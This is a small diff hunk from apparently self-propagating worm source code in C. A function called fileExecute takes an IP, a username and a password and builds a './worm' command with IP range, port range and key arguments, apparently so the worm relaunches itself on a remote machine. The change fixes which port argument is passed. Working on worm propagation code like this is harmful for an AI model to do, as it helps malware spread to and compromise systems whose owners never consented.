@@ -416,7 +416,7 @@ void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char 
         strcpy(buff, "./worm ");
         strcat(buff, range_ipSeq);
         strcat(buff," ");
-        strcat(buff, range_ipPort);
+        strcat(buff, range_portSeq);
         strcat(buff," ");
         strcat(buff, tamKey);
         strcat(buff,"\n");
